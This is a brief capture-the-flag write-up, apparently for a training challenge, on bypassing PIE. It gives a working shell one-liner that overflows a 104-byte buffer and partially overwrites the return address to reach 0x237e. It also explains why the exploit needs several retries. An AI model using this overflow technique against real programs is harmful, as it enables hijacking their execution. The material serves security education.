# PIEs (easy)

1. GDB -> `disas win_authed` -> the address of instruction after auth check is **0x237e**
2. As told in the debug output, the return address from challenge() is stored at 104 bytes from start of input buffer.

    ```shell
    echo -n -e "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x7e\x23" | /challenge/binary-exploitation-pie-overflow-w
    ```

> we need to write two bytes, then one of those nibbles (the fourth least-significant one) will be a guess, and it will be incorrect 15 of 16 times. This is okay: we can just run our exploit a few times until it works (statistically, ~50% chance after 11 times and ~90% chance after 36 times)
